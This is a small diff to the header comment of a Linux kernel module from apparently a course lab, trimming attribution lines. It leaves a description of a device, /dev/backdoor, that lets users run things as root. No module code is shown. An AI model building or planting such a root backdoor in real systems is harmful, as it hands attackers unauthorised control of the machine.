@@ -1,10 +1,4 @@
-/**
- * CSC 453 Lab 5
- * Nathaniel "Nat" Welch
- * Creates a device /dev/backdoor which allows you to run things as root.
- *
- * This is based off of code from http://www.tldp.org/LDP/lkmpg/2.6/html/lkmpg.html
- * Section 4 and Section 7
+/**Creates a device /dev/backdoor which allows you to run things as root.
  */
 
 #include <linux/kernel.h>
